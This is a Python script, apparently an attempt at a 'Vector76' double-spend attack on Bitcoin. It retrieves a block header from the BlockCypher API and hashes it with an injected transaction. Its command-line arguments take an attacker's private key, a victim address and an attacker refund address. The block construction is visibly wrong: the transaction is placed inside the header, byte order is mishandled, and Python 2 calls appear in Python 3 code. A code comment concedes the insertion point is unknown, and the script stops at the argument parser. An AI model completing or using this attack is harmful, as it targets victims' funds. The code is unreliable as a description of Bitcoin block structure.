from hashlib import sha256
import requests
from bitcoin_tools.core.transaction import TX
from bitcoin_tools.core.keys import load_keys
from datetime import datetime
import argparse

def to_satoshi(btc_amount):
    satoshi = 0.00000001
    return btc_amount // satoshi

def get_block_header_by_txid(txid, network):
    # URL to get transaction information
    tx_url = f'https://api.blockcypher.com/v1/btc/{network}/txs/{txid}'
    
    # Request transaction information
    tx_response = requests.get(tx_url)
    if tx_response.status_code != 200:
        print(f"Error while retrieving transaction information: {tx_response.status_code}")
        return
    
    tx_data = tx_response.json()
    
    # Obtaining a block hash from transaction data
    block_hash = tx_data.get('block_hash')
    if not block_hash:
        print("Transaction not found in block.")
        return
    
    # URL to get block information
    block_url = f'https://api.blockcypher.com/v1/btc/{network}/blocks/{block_hash}'
    
    # Request information about a block
    block_response = requests.get(block_url)
    if block_response.status_code != 200:
        print(f"Error while retrieving block information: {block_response.status_code}")
        return
    
    block_data = block_response.json()
    
    # Getting Block Header
    block_header = {
        'Block': block_data.get('hash'),
        'Block Height': block_data.get('height'),
        'Mined Time': block_data.get('time'),
        'Prev Block': block_data.get('prev_block'),
        'Merkle Root': block_data.get('mrkl_root'),
        'Nonce': block_data.get('nonce'),
        'Bits': block_data.get('bits'),
        'Version': block_data.get('ver')
    }
    print(f"Block: {block_data.get('hash')}")
    print(f"Block Height: {block_data.get('height')}")
    print(f"Mined Time: {block_data.get('time')}")
    print(f"Prev Block :  {block_data.get('prev_block')}")
    print(f"Merkle Root : {block_data.get('mrkl_root')}")
    print(f"Nonce: {block_data.get('nonce')}")
    print(f"Bits: {block_data.get('bits')}")
    print(f"Version: {block_data.get('ver')}")
    return block_header



def mine_vector76_block(block_header_V, inject_tx):
    version_hex    = format(block_header_V["Version"], "08x")[::-1]
    #block_hex      = block_header_V["Block"][::-1]
    #height_hex = format(block_header_V["Block Heihgt"], "x")[::-1]
    prev_block_hex = block_header_V["Prev Block"][::-1]
    markle_root_hex = block_header_V["Merkle Root"][::-1]
    timestamp_s = int((datetime.strptime(block_header_V["Mined Time"], "%Y-%m-%d %H:%M:%S")-datetime(1970,1,1)).total_seconds())
    timestamp_hex = format(timestamp_s,"x")[::-1]
    bits_hex  = format(block_header_V["Bits"], "x")[::-1]
    nonce_hex = format(block_header_V["Nonce"], "x")[::-1]

    # 金融庁の資料によると、一つ目のトランザクションを含めてマイニンングするらしいが挿入する箇所はわかっていない。
    vector76_blockheader = f"{version_hex}{prev_block_hex}{markle_root_hex}{timestamp_hex}{bits_hex}{inject_tx}{nonce_hex}"
    block_hash = sha256(sha256(vector76_blockheader).digest()).digest()[::-1].encode("hex")
    print(f"Block Hash : {block_hash}")
    return block_hash

parser = argparse.ArgumentParser(description="How To Use transaction_builder")
parser.add_argument("attacker_signkey",
                    help="The attacker has the WIF format private key of the first address (this is used to sign the transaction)",
                    type=str)
parser.add_argument("victim_address",
                    help="victim address.",
                    type=str)
parser.add_argument("attacker_address",
                    help="Address held by attacker to receive refund (Please prepare an address that is different from the address that can be generated with the private key specified in the first place.)",
                    type=str)
parser.add_argument("amount_of_coins",
                    help="Amount of coins sent. (Enter in BTC units)",
                    type=float)